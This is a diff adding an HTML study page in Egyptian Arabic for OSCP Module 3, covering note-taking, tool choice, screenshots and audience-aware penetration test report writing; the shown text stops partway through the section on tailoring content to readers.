@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 3: كتابة التقارير لمختبري الاختراق</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0: #0B0B0D;
+    --bg-1: #121214;
+    --surface: #17171A;
+    --surface-2: #1D1D21;
+    --border: #2A2A2F;
+    --border-soft: #232326;
+
+    --text: #E6E6E9;
+    --text-soft: #C4C4CA;
+    --muted: #8A8A92;
+
+    --red: #E1362F;
+    --red-soft: rgba(225,54,47,0.10);
+    --red-border: rgba(225,54,47,0.35);
+    --red-grad: linear-gradient(90deg, #E1362F, #F2794A);
+
+    --amber: #E8A23A;
+    --amber-soft: rgba(232,162,58,0.09);
+    --amber-border: rgba(232,162,58,0.30);
+
+    --green: #3FBF6E;
+
+    --mono: 'IBM Plex Mono', 'Courier New', monospace;
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body {
+    margin: 0;
+    padding: 0;
+    direction: rtl;
+    text-align: right;
+    background: var(--bg-0);
+  }
+
+  body {
+    font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+    line-height: 1.95;
+    font-size: 16.5px;
+    color: var(--text);
+    background:
+      radial-gradient(900px 420px at 12% -8%, rgba(225,54,47,0.10), transparent 60%),
+      radial-gradient(800px 420px at 90% 6%, rgba(232,162,58,0.06), transparent 60%),
+      linear-gradient(180deg, var(--bg-0) 0%, var(--bg-1) 100%);
+    background-attachment: fixed;
+  }
+
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 46px 22px 100px;
+  }
+
+  /* ---------- Terminal-style banner ---------- */
+  .banner {
+    position: relative;
+    overflow: hidden;
+    background: linear-gradient(155deg, #17171A 0%, #141416 55%, #18151A 100%);
+    border: 1px solid var(--border-soft);
+    border-radius: 10px;
+    padding: 0 0 34px;
+    margin-bottom: 26px;
+    box-shadow: 0 20px 50px -20px rgba(0,0,0,0.6);
+  }
+  .term-bar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 13px 18px;
+    border-bottom: 1px solid var(--border-soft);
+    background: rgba(255,255,255,0.015);
+    direction: ltr;
+  }
+  .term-dot { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+  .term-dot.r { background: #E1362F; }
+  .term-dot.y { background: #E8A23A; }
+  .term-dot.g { background: #3FBF6E; }
+  .term-path {
+    margin-inline-start: 12px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--muted);
+  }
+  .banner-body { padding: 30px 34px 4px; }
+  .banner .kicker {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    letter-spacing: 0.03em;
+    color: var(--red);
+    background: var(--red-soft);
+    border: 1px solid var(--red-border);
+    border-radius: 3px;
+    padding: 5px 12px;
+    margin-bottom: 20px;
+    direction: ltr;
+  }
+  .banner h1 {
+    margin: 0 0 14px;
+    font-size: 28px;
+    font-weight: 800;
+    line-height: 1.5;
+    color: #F4F4F6;
+  }
+  .banner .lede {
+    color: var(--muted);
+    font-size: 15.5px;
+    line-height: 1.95;
+    max-width: 620px;
+    margin: 0 0 24px;
+  }
+  .tags { display: flex; flex-wrap: wrap; gap: 9px; }
+  .tag {
+    font-size: 12.5px;
+    font-family: var(--mono);
+    color: var(--amber);
+    background: var(--amber-soft);
+    border: 1px solid var(--amber-border);
+    border-radius: 3px;
+    padding: 5px 11px;
+  }
+
+  /* ---------- TOC: directory-listing style ---------- */
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+    padding: 6px 0 6px;
+    margin-bottom: 50px;
+    overflow: hidden;
+  }
+  .toc-title {
+    font-family: var(--mono);
+    font-weight: 600;
+    font-size: 13px;
+    color: var(--green);
+    padding: 14px 22px;
+    border-bottom: 1px solid var(--border-soft);
+    direction: ltr;
+    text-align: left;
+  }
+  .toc-list { display: flex; flex-direction: column; }
+  .toc-item {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 12px 22px;
+    color: var(--text-soft);
+    text-decoration: none;
+    font-size: 14.5px;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    transition: background 0.15s ease, padding-inline-start 0.15s ease;
+  }
+  .toc-list .toc-item:last-child { border-bottom: none; }
+  .toc-item:hover { background: rgba(225,54,47,0.06); }
+  .toc-num {
+    flex: none;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    font-weight: 600;
+    color: #0F0F10;
+    background: var(--red-grad);
+    border-radius: 3px;
+    padding: 3px 8px;
+    direction: ltr;
+  }
+
+  /* ---------- Typography ---------- */
+  h1, h2, h3, h4 { font-weight: 700; }
+
+  h2 {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    font-size: 21px;
+    margin: 66px 0 22px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border-soft);
+    color: #F0F0F2;
+  }
+  h2 .num {
+    flex: none;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    color: #0F0F10;
+    background: var(--red-grad);
+    border-radius: 5px;
+    padding: 7px 12px;
+    direction: ltr;
+  }
+  h2 .htext { line-height: 1.5; }
+
+  h3 {
+    font-size: 17px;
+    margin: 34px 0 14px;
+    color: var(--red);
+    display: flex;
+    align-items: center;
+    gap: 9px;
+  }
+  h3::before {
+    content: "#";
+    font-family: var(--mono);
+    color: var(--amber);
+    font-weight: 700;
+  }
+
+  h4 {
+    font-size: 14.8px;
+    margin: 22px 0 10px;
+    color: var(--text-soft);
+    font-family: var(--mono);
+  }
+
+  p { margin: 0 0 17px; color: var(--text); }
+
+  strong { color: #FBFBFC; font-weight: 700; }
+
+  a { color: var(--amber); text-decoration: none; border-bottom: 1px dashed var(--amber-border); }
+
+  hr {
+    border: none;
+    height: 1px;
+    margin: 50px 0;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+  }
+
+  ul, ol {
+    margin: 0 0 18px;
+    padding-inline-start: 24px;
+  }
+  li { margin-bottom: 9px; color: var(--text); }
+  li::marker { color: var(--red); font-family: var(--mono); }
+  li > ul, li > ol { margin-top: 9px; }
+
+  /* ---------- Blockquotes = key definitions / case studies ---------- */
+  blockquote {
+    margin: 24px 0;
+    padding: 17px 22px;
+    background: var(--red-soft);
+    border: 1px solid var(--red-border);
+    border-inline-start: 3px solid var(--red);
+    border-radius: 6px;
+    color: #EAD9D7;
+  }
+  blockquote p { margin: 0; color: inherit; line-height: 1.85; }
+  blockquote strong { color: #FFB4AE; }
+
+  /* ---------- Tables ---------- */
+  .table-wrap {
+    overflow-x: auto;
+    margin: 22px 0;
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 14.2px;
+    min-width: 480px;
+  }
+  thead th {
+    background: var(--surface-2);
+    color: var(--amber);
+    font-weight: 700;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    text-transform: uppercase;
+    letter-spacing: 0.02em;
+    text-align: start;
+    padding: 13px 15px;
+    border-bottom: 1px solid var(--border-soft);
+    white-space: nowrap;
+  }
+  tbody td {
+    padding: 12px 15px;
+    border-bottom: 1px solid var(--border-soft);
+    color: var(--text-soft);
+    vertical-align: top;
+  }
+  tbody tr:last-child td { border-bottom: none; }
+  tbody tr:nth-child(even) { background: rgba(255,255,255,0.012); }
+  tbody tr:hover { background: rgba(225,54,47,0.045); }
+
+  /* ---------- Code / terminal blocks ---------- */
+  code {
+    font-family: var(--mono);
+    font-size: 13.3px;
+    background: var(--surface-2);
+    border: 1px solid var(--border-soft);
+    border-radius: 4px;
+    padding: 2px 6px;
+    direction: ltr;
+    unicode-bidi: embed;
+    color: var(--green);
+  }
+  .code-wrap { overflow-x: auto; margin: 22px 0; }
+  pre {
+    background: #0E0E10;
+    border: 1px solid var(--border-soft);
+    border-inline-start: 3px solid var(--red);
+    border-radius: 8px;
+    padding: 18px 22px;
+    direction: ltr;
+    text-align: left;
+    margin: 0;
+  }
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: #B9E8C9;
+    font-size: 13.2px;
+    line-height: 1.75;
+  }
+
+  /* ---------- Footer ---------- */
+  .footer-note {
+    margin-top: 70px;
+    padding-top: 26px;
+    border-top: 1px solid var(--border-soft);
+    color: var(--muted);
+    font-size: 13.3px;
+    font-family: var(--mono);
+    text-align: center;
+    direction: ltr;
+  }
+
+  @media (max-width: 640px) {
+    .page { padding: 28px 14px 70px; }
+    .banner-body { padding: 24px 20px 4px; }
+    .banner h1 { font-size: 21px; }
+    h2 { font-size: 18px; gap: 10px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="banner">
+    <div class="term-bar">
+      <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+      <span class="term-path">root@oscp:~/module-03$</span>
+    </div>
+    <div class="banner-body">
+      <span class="kicker">OSCP · PEN-200 · Module 03</span>
+      <h1>كتابة التقارير لمختبري الاختراق</h1>
+      <p class="lede">إزاي تدوّن ملاحظات قابلة لإعادة الإنتاج أثناء المهمة، واختيار الأداة الصح، لحد كتابة تقرير تقني احترافي — Executive Summary، تخصيص المحتوى حسب الجمهور، ترتيب أولوية المخاطر بالسياق، ونموذج تقرير كامل بنتائج حقيقية.</p>
+      <div class="tags">
+        <span class="tag">note-taking</span>
+        <span class="tag">executive-summary</span>
+        <span class="tag">report-writing</span>
+        <span class="tag">sample-report</span>
+        <span class="tag">findings</span>
+      </div>
+    </div>
+  </div>
+
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+<a class="toc-item" href="#lu1"><span class="toc-num">01</span><span class="toc-label">فهم تدوين الملاحظات (Understanding Note-Taking)</span></a>
+<a class="toc-item" href="#lu2"><span class="toc-num">02</span><span class="toc-label">كتابة تقارير اختبار اختراق تقنية فعّالة</span></a>
+<a class="toc-item" href="#lu3"><span class="toc-num">03</span><span class="toc-label">نموذج تطبيقي: تقرير اختبار اختراق كامل (Full Sample Pentest Report)</span></a>
+</div></nav>
+
+<h1>Module 3: كتابة التقارير لمختبري الاختراق (Report Writing for Penetration Testers)</h1>
+<blockquote>
+<p>الموديول ده مصمَّم عشان يساعد مختبري الاختراق يفهموا إزاي يسلّموا تقارير فعّالة لعملائهم. مقسَّم لوحدتين تعليميتين: فهم تدوين الملاحظات، وكتابة تقارير اختبار اختراق تقنية فعّالة.</p>
+</blockquote>
+<p><strong>الوحدات التعليمية اللي الموديول ده بيغطيها:</strong></p>
+<ol>
+<li><strong>Understanding Note-Taking</strong> – فهم تدوين الملاحظات</li>
+<li><strong>Writing Effective Technical Penetration Testing Reports</strong> – كتابة تقارير اختبار اختراق تقنية فعّالة</li>
+</ol>
+<hr />
+<h2 id="lu1"><span class="num">01</span><span class="htext">فهم تدوين الملاحظات (Understanding Note-Taking)</span></h2>
+<h3>أهداف الوحدة</h3>
+<p>مراجعة مُخرجات (deliverables) مهام اختبار الاختراق | فهم أهمية قابلية نقل الملاحظات (portability) | تحديد البنية العامة لتوثيق اختبار الاختراق | اختيار أداة تدوين الملاحظات المناسبة | فهم أهمية التقاط لقطات الشاشة | استخدام أدوات لالتقاط لقطات الشاشة</p>
+<h3>ليه الملاحظات أهم من القوالب الجاهزة</h3>
+<p>إجراء اختبار اختراق أو مهمة red team مش حاجة ممكن تتحدد بالكامل مقدمًا بسكريبت جاهز. السبب الأساسي إن المختبرين نادرًا ما يكون عندهم رؤية كاملة للأنظمة، البنية التحتية، أو إعدادات الشبكة اللي هيقابلوها أثناء التقييم. نتيجة لكده، المهمة غالبًا بتتطور بشكل مختلف عن التوقعات الأصلية.</p>
+<p>رغم إن النتائج المحددة لتقييم معين مش ممكن نتوقعها مقدمًا، أساسي نحدد <strong>نطاق (scope)</strong> واضح أثناء النقاشات الأولية مع العميل. النطاق المحدَّد بوضوح بيساعد نحدد الأصول التجارية الحرجة ويضمن إن الأهداف عالية القيمة تاخد الاهتمام المناسب، خاصةً في البيئات الكبيرة والمعقَّدة.</p>
+<p>رغم إن اختبارات الاختراق عادةً بتتبع منهجية منظَّمة، المهام الواقعية غالبًا بتنحرف عن الخطة الأصلية بمجرد ما الاختبار يبدأ. البيئة العملية غالبًا بتختلف عن الافتراضات النظرية، محتاجة مرونة وتكيّف.</p>
+<blockquote>
+<p><strong>لهذا السبب، الاعتماد على قوالب تقارير مُعبّأة مسبقًا غير فعّال عمومًا.</strong> ده صحيح بشكل خاص في المهام اللي بتُنفَّذ بإفصاح مسبق محدود، زي تمارين red team المصمَّمة لمحاكاة سلوك خصم واقعي وممكن تفاجئ فرق الدفاع.</p>
+</blockquote>
+<p>بدل تحضير تقرير نهائي مقدمًا، التقييم بيتنفّذ أولًا، مع توثيق تفصيلي بيتسجّل طول العملية. الحفاظ على ملاحظات شاملة بيضمن:</p>
+<ul>
+<li>إمكانية إعادة إنتاج إجراءات الاختبار للتحقق من وجود ثغرة فعلًا</li>
+<li>إمكانية إعادة التقييم بعد العلاج للتأكد إن الإجراءات التصحيحية نجحت</li>
+<li>في حالة عطل في النظام أثناء المهمة، العميل والمختبر الاتنين يقدروا يراجعوا سجل النشاط عشان يحددوا إذا كانت أنشطة الاختبار ساهمت في المشكلة</li>
+</ul>
+<h3>Rules of Engagement (RoE)</h3>
+<p>أساسي كمان إننا نحدد بوضوح <strong>قواعد الاشتباك (Rules of Engagement - RoE)</strong> قبل بدء أي نشاط اختبار. القواعد دي بتحدد الحدود والأفعال المسموحة أثناء المهمة.</p>
+<p>في عمليات red team، غالبًا بيتعين دور إشراف مخصَّص لمراقبة الامتثال للقيود المتفق عليها. العملاء ممكن يفرضوا قيود محددة، زي منع محاولات denial-of-service أو تقييد تقنيات الـ social engineering.</p>
+<p>في بعض الحالات، التقييم ممكن كمان يكون مدفوع بمتطلبات تنظيمية أو امتثال، محتاج الالتزام بإطار أو معيار معترَف بيه، زي <strong>OWASP Penetration Testing Execution Standard</strong>.</p>
+<blockquote>
+<p>كل القيود والتوقعات المنهجية لازم تتفق عليها صراحةً قبل بدء المهمة لضمان الشفافية والاحترافية.</p>
+</blockquote>
+<h3>قابلية نقل الملاحظات (Note Portability)</h3>
+<p>قابلية نقل توثيق اختبار الاختراق بتشير لقدرتنا ننقل ونشارك السجلات دي مع أعضاء الفريق التانيين بفعالية. إنشاء ملاحظات واضحة، منظَّمة بشكل جيد، ومباشرة جانب أساسي من التوثيق السليم.</p>
+<p>ده بيضمن إن المعلومة مش بس مفيدة للمختبر الأصلي، لكن كمان ممكن تُفهم وتُستخدم بسهولة من الآخرين. الملاحظات المكتوبة كويس كمان ممكن تتحول بكفاءة لأقسام في تقرير تقني رسمي وقت الحاجة.</p>
+<p>قابلية النقل بتبقى حرجة بشكل خاص لو مختبر الاختراق مش قادر يكمّل الشغل على مهمة بسبب مشاكل صحية أو ظروف غير متوقَّعة. في المواقف دي، التوثيق الشامل والموحَّد بيسمح لعضو فريق تاني ياخد المهمة بسلاسة من غير ما يفقد السياق.</p>
+<blockquote>
+<p>لفرق الأمان الأكبر، إرساء نهج توثيق متسق أساسي. لما الجميع بيتبع منهجية تدوين ملاحظات مشتركة، أعضاء الفريق يقدروا يراجعوا، يفهموا، ويكملوا شغل بعض بسرعة من غير ارتباك.</p>
+</blockquote>
+<h3>البنية العامة لملاحظات اختبار الاختراق</h3>
+<p>تدوين الملاحظات الفعّال أثناء اختبار الاختراق محتاج نهج منهجي ومنظَّم بيوازن بين الوضوح والإيجاز. مفيش صيغة عالمية مثالية تناسب كل سيناريو، لكن فيه مبادئ توجيهية ممكن تحسّن جودة وفائدة سجلات الاختبار بشكل كبير.</p>
+<p>بدل ما نكتب تذكيرات غامضة ونفترض إننا هنتذكر الخطوات بالظبط بعدين، المفروض نوثّق أفعالنا بتفاصيل دقيقة. كل أمر اتنفّذ، كل تغيير إعداد اتعمل، كل جزء كود اتعدّل، وحتى التفاعلات جوه الواجهات الرسومية — كلها لازم تتسجّل.</p>
+<blockquote>
+<p><strong>الهدف هو إعادة الإنتاج الكاملة (full reproducibility).</strong> لو مراجعة ملاحظاتنا في مرحلة لاحقة مكّنتناش من إعادة بناء إيه اللي حصل بوضوح، يبقى التوثيق فشل في غرضه.</p>
+</blockquote>
+<h3>النهج Top-Down</h3>
+<p>استراتيجية توثيق عملية ومرنة هي اتباع بنية <strong>top-down</strong>: ابدأ بمعلومات عالية المستوى عن المهمة أو حالة الاختبار، وبعدين ضيّق التركيز تدريجيًا بإضافة عمق تقني. النهج الطبقي ده بيضمن إن الملاحظات تفضل قابلة للقراءة مع احتوائها تفاصيل كافية لإعادة بناء التسلسل الدقيق للأحداث.</p>
+<p><strong>مثال: توثيق ثغرة ويب مكتشَفة</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>العنصر</th>
+<th>الوصف</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Application Name</strong></td>
+<td>مهم بشكل خاص في التقييمات اللي بتشمل تطبيقات متعددة؛ كمان بيساعد في الحفاظ على بنية مجلدات منظَّمة للملفات والأدلة</td>
+</tr>
+<tr>
+<td><strong>Exact URL</strong></td>
+<td>النقطة الدقيقة اللي اتحددت فيها الثغرة</td>
+</tr>
+<tr>
+<td><strong>HTTP Method</strong></td>
+<td>نوع الطلب المستخدَم (GET، POST، PUT...إلخ)، بما فيها أي تعديلات اتعملت يدويًا — زي اعتراض وتغيير باراميترات قبل تمرير الطلب</td>
+</tr>
+<tr>
+<td><strong>Vulnerability Description</strong></td>
+<td>ملخّص للضعف المُلاحَظ، ممكن يشير لـ CVE معروف لو منطبق. التأثير كمان لازم يُذكر بوضوح (مثلًا: remote code execution، denial of service، privilege escalation)</td>
+</tr>
+<tr>
+<td><strong>Proof-of-Concept (PoC) Payload</strong></td>
+<td>المدخل، السكربت، أو الأمر المحدد اللازم لتحفيز المشكلة. القسم ده لازم يشمل كل المتطلبات المسبقة والخطوات الدقيقة اللازمة لإعادة إنتاج الثغرة، لأنه بيُعتبر الدليل التقني الداعم للنتيجة</td>
+</tr>
+</tbody>
+</table></div>
+<h3>اختيار أداة تدوين الملاحظات الصح</h3>
+<p>النهارده فيه مدى واسع من تطبيقات تدوين الملاحظات المتاحة، سواء مفتوحة المصدر أو تجارية. اختيار الأداة الأنسب لمهمة معينة محتاج تقييم الاحتياجات العملية للتقييم. مثلًا، في مواقف كتير، الأفضلية إننا نخزّن كل التوثيق محليًا بدل مزامنة البيانات لخدمات cloud، وده فورًا بيستبعد بعض المنصات من الاعتبار.</p>
+<p><strong>القدرات الأساسية اللي لازم تتحط في الأولوية:</strong></p>
+<ul>
+<li><strong>Screenshot Support</strong> – لو المهمة محتاجة التقاط لقطات شاشة كتيرة كدليل، الأداة لازم تسمح بتضمين الصور مباشرة جوه الملاحظات</li>
+<li><strong>Code Formatting</strong> – أقسام كود منسَّقة كويس بتحسّن الوضوح وتقلل سوء الفهم — الـ syntax-aware formatting بيعزّز سهولة القراءة بشكل كبير</li>
+<li><strong>Cross-Platform Compatibility</strong> – القدرة على استخدام الأداة عبر أنظمة تشغيل مختلفة — أو نقل الملاحظات بينهم بسهولة</li>
+<li><strong>Organized File Structure</strong> – المهام اللي بتشمل نطاقات، hosts، أو تطبيقات متعددة بتتطلب هيكل منطقي واضح</li>
+</ul>
+<h3>مقارنة أدوات تدوين الملاحظات</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>الأداة</th>
+<th>المميزات</th>
+<th>القيود</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Sublime Text</strong></td>
+<td>محرر نصوص غني بالميزات، بيئة قابلة للتخصيص، syntax highlighting قوي</td>
+<td>ملف واحد عادةً بيدعم تعريف syntax أساسي واحد بس؛ تضمين لقطات الشاشة مش مدعوم أصليًا</td>
+</tr>
+<tr>
+<td><strong>CherryTree</strong></td>
+<td>متضمَّن افتراضيًا في Kali Linux؛ بيخزّن الملاحظات في قاعدة بيانات SQLite؛ بيدعم التصدير لـ HTML، PDF، نص عادي، وصيغته الخاصة؛ تنظيم هرمي (parent/child nodes) مفيد لتصنيف النتائج حسب النطاق، الـ host، أو نوع الثغرة</td>
+<td>—</td>
+</tr>
+<tr>
+<td><strong>Obsidian</strong></td>
+<td>محرر مبني على markdown؛ تنسيق مرن، يدعم أكواد ومحتوى مضمَّن؛ بيشتغل بملفات محلية بالكامل افتراضيًا؛ متاح كـ Snap، Flatpak، أو AppImage مستقل (الأخير بس محتاج تحميل الملف، منح صلاحية تنفيذ، وتشغيله — من غير تثبيت كامل)</td>
+<td>—</td>
+</tr>
+</tbody>
+</table></div>
+<h3>التقاط لقطات الشاشة (Screenshots)</h3>
+<p>لقطات الشاشة بتلعب دور حرج في كل من التوثيق والتقرير الرسمي أثناء اختبار الاختراق. صورة جيدة التحضير تقدر توصّل ثغرة فورًا، وغالبًا بشكل أفعل من فقرات شرح كتيرة. مهمة بشكل خاص لما بنقدّم نتائج كثيفة تقنيًا، حيث الإثبات البصري بيبسّط المفاهيم المعقَّدة.</p>
+<p>الدليل البصري غالبًا أكتر إقناعًا من الوصف الكتابي لوحده. مثلًا، عرض تنبيه متصفح اتحفّز بـ XSS payload بيوضّح بشكل واضح تنفيذ JavaScript ناجح بطريقة الكلمات ممكن تفشل توصيلها.</p>
+<p>لكن مش كل سيناريو تقني الأفضل تمثيله بصريًا — ثغرات زي <strong>buffer overflows</strong> ممكن تحتاج شرح نصي أو لوجات عشان توصّل بدقة إيه اللي حصل.</p>
+<blockquote>
+<p><strong>لقطات الشاشة لها غرضان أساسيان:</strong> تعزيز الملاحظات الداخلية، وتقوية تقرير العميل النهائي. لازم دايمًا تكون مصحوبة بشرح نصي موجز، لأن اللي بيبان واضح لمتخصص أمان ممكن مايبقاش واضح فورًا لمطوّر أو صاحب مصلحة مش مألوف بالثغرة.</p>
+</blockquote>
+<p><strong>مبادئ اللقطة الفعّالة:</strong> يجب أن تكون مفهومة فورًا | القارئ يقدر يفسّر الصورة والتعليق بدون غموض | البساطة والتركيز مفتاح أساسي | ركّز على مفهوم واحد فقط — تضمين نقاط متعددة غير مرتبطة في صورة واحدة بيقلل الوضوح | العنصر المحوري المفروض يكون في المنتصف ومؤطَّر بشكل سليم | التعليقات (captions) لازم تفضل موجزة</p>
+<h3>أدوات التقاط لقطات الشاشة حسب نظام التشغيل</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>النظام</th>
+<th>الطريقة</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Windows</strong></td>
+<td><code>Print Screen</code> بينسخ الشاشة كاملة للـ clipboard. <code>Alt + Print Screen</code> بيلتقط النافذة النشطة بس. الصورة بعدين تُلصق في Paint، Word، أو PowerPoint للتعديل</td>
+</tr>
+<tr>
+<td><strong>Linux</strong></td>
+<td><code>Print Screen</code> عادةً بيلتقط الشاشة كاملة ويحفظها تلقائيًا (غالبًا في مجلد Pictures). <code>Shift + Print Screen</code> بيمكّن اختيار منطقة محددة. في Kali Linux، أداة Screenshot مدمجة بتوفّر التقاط النافذة النشطة، اختيار منطقة مخصَّصة، وإضافة تأخير زمني</td>
+</tr>
+<tr>
+<td><strong>macOS</strong></td>
+<td>لقطات الشاشة ممكن تُلتقط باستخدام اختصارات لوحة المفاتيح <code>Shift + Command</code></td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="lu2"><span class="num">02</span><span class="htext">كتابة تقارير اختبار اختراق تقنية فعّالة</span></h2>
+<h3>أهداف الوحدة</h3>
+<p>تحديد الغرض من التقرير التقني | فهم إزاي نخصّص المحتوى | بناء Executive Summary | مراعاة اعتبارات بيئة الاختبار المحددة | إنشاء ملخّص تقني | وصف النتائج التقنية والتوصيات | التعرّف على متى نستخدم الملاحق، معلومات إضافية، والمراجع</p>
+<h3>الغرض من التقرير التقني</h3>
+<p>كمقدّمين لخدمات اختبار الاختراق، هدفنا هو تقديم قيمة حقيقية لعملائنا. الوسيلة الأساسية لتوصيل القيمة دي هي <strong>التقرير النهائي</strong>. هو النتيجة الملموسة للمهمة والمستند اللي بيمكّن العميل من اتخاذ قرارات مدروسة.</p>
+<p>اكتشاف ثغرات كتيرة مالوش فايدة عملية كبيرة لو النتائج دي ما اتوصّلتش بوضوح مع إرشادات علاج عملية. من غير توصيات قابلة للتنفيذ، العميل مش هيقدر يترجم النتائج التقنية لتحسينات تجارية.</p>
+<p><strong>عشان نكتب تقرير فعّال، لازم نفهم حاجتين أساسيتين:</strong></p>
+<ol>
+<li>الهدف من التقرير</li>
+<li>إزاي نقدّم المعلومات المجمَّعة بصيغة مناسبة للجمهور المستهدف</li>
+</ol>
+<blockquote>
+<p>كتير من المؤسسات بتفترض بشكل خاطئ إنها بتدفع بس لـ "ethical hacker" يحاكي هجمات ضد أنظمتها. رغم إن الاستغلال المتحكَّم فيه جزء من العملية، ده مش الغرض النهائي. فعليًا، بعض المؤسسات بتفضّل أقل اضطراب واستغلال فعّال محدود.</p>
+</blockquote>
+<p>الهدف الحقيقي لمهمة اختبار الاختراق هو <strong>توفير الوضوح</strong> — إبراز نقاط الضعف الموجودة جوه النطاق المتفق عليه، توضيح الإجراءات التصحيحية الفورية، وتقديم توصيات استراتيجية لمنع تكرارها.</p>
+<p>لمعظم العملاء، تقرير اختبار الاختراق هو <strong>أهم مُخرج واحد</strong>. هو خارطة الطريق اللي بتترجم النتائج التقنية لتحسينات تشغيلية واستراتيجية.</p>
+<p><strong>لما ملقناش ثغرات في منطقة معينة:</strong> عادةً مش محتاجين تفاصيل تقنية مفرطة. بيان موجز بيأكّد إن مفيش مشاكل اتحددت عادةً كافي. تحميل التقرير بوصف معقّد لمحاولات غير ناجحة ممكن يشتّت عن النتائج الحقيقية ويضعف تأثيرها — لكن أسلوب التقرير دايمًا المفروض يراعي توقعات العميل، لأن بعض المؤسسات بتفضّل توثيق تقني شامل حتى للنتائج السلبية.</p>
+<h3>فهم الجمهور وأولويات المخاطر</h3>
+<p>فهم الجمهور حرج. العملاء خبراء في مجالهم وغالبًا بيعملوا تحت أطر تنظيمية محددة. بيتوقعوا إن التقييم يعكس وعي بمخاطر صناعتهم المحددة. ده محتاج فهم لأولويات المؤسسة التشغيلية وأهدافها التجارية. الـ <strong>Rules of Engagement</strong> المحدَّدة بوضوح قيّمة هنا، لأنها غالبًا بتكشف إيه اللي العميل بيعتبره الأكتر حساسية أو حرجًا.</p>
+<p>كل الثغرات المحددة لازم تتوثّق، لكن اهتمام خاص لازم يتحط على اللي بتأثر على الامتثال التنظيمي أو الوظائف التشغيلية الأساسية. مثلًا، مؤسسات الرعاية الصحية ممكن تهتم بامتثال HIPAA، بينما المؤسسات المالية لازم تلتزم بمعايير PCI.</p>
+<blockquote>
+<p><strong>مثال موضّح:</strong> تخيل مهمتين افتراضيتين — واحدة مع مستشفى والتانية مع بنك. تقنيًا، البيئتين ممكن تظهروا ثغرات مشابهة بنفس درجات الخطورة. لكن ترتيب أولوية المخاطر ممكن يختلف بشكل كبير.</p>
+<p>في بيئة المستشفى، الحفاظ على uptime للأنظمة الطبية أمر بالغ الأهمية — توصيات العلاج ممكن تركّز على تقسيم الشبكة أو العزل بدل الـ patching الفوري، إدراكًا للواقع التشغيلي.</p>
+<p>في بيئة البنك، سيرفر غير مرقَّع ممكن يمثّل مسار مباشر لأنظمة مالية حساسة — ده ممكن يمثّل مشكلة حرجة تتطلب علاج عاجل.</p>
+</blockquote>
+<p><strong>السياق كمان بيأثر على تقييم الخطر:</strong> نقل بيانات اعتماد الدخول عبر HTTP غير مشفّر غير آمن جوهريًا. لو مكشوف على الإنترنت العام، ده بيشكّل ثغرة شديدة؛ جوه شبكة داخلية مقيَّدة، الخطر — رغم وجوده — ممكن يكون أقل نسبيًا بسبب حواجز إضافية للاستغلال.</p>
+<blockquote>
+<p><strong>مسؤولية كاتب التقرير</strong> هي تقديم النتائج بموضوعية، دقة، وبطريقة تمكّن من اتخاذ فعل — التقرير المفروض يركّز على التأثير العملي والعلاج من غير ما الآراء الشخصية أو الافتراضات تشوّه التقييم.</p>
+</blockquote>
+<h3>تخصيص المحتوى (Tailor the Content)</h3>
+<p>تقرير اختبار الاختراق المفروض يُكتب بطريقة بتستوعب قراء بمستويات خبرة تقنية مختلفة. المستند ممكن يراجعه مديرين تنفيذيين، قيادة أمنية، وفرق تقنية عملية. لازم يحقق توازن بين الوضوح عالي المستوى والدقة التقنية العميقة.</p>
+<p><strong>الجمهور الأول: الإدارة العليا</strong></p>
+<p>المجموعة دي غالبًا مسؤولة عن الموافقة على المهمة وتقييم العائد على الاستثمار (ROI). ممكن تشمل تنفيذيين زي CISO، CSO، CIO، أو CFO، وكمان مديري IT أو أمان. أصحاب المصلحة دول مهتمين أساسًا بالتأثير التجاري، التعرّض للمخاطر، والآثار الاستراتيجية — مش تفاصيل التنفيذ التقني.</p>
+<p><strong>الجمهور الثاني: الفرق التقنية المسؤولة عن العلاج</strong></p>
+<p>ده بيشمل مهندسي أمان، مسؤولي أنظمة، مطورين، وموظفي عمليات IT. عكس القراء التنفيذيين، المجموعة دي محتاجة شروحات مفصَّلة — معلومات تقنية دقيقة بتوصّف إزاي كل ثغرة اتحددت، الظروف المطلوبة للاستغلال، التأثير المرتبط، والخطوات الدقيقة للعلاج.</p>
